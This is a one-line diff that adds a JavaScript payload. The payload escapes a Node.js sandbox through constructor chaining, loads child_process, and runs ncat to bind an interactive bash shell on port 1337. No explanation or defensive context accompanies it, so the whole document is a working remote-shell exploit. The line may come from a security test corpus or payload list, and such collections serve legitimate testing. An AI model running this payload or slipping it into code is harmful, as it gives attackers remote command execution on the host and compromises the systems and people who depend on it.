@@ -1,0 +1,1 @@
+(this.constructor.constructor("return process.mainModule.require('child_process')")()).execSync('ncat -e /bin/bash -lp 1337')
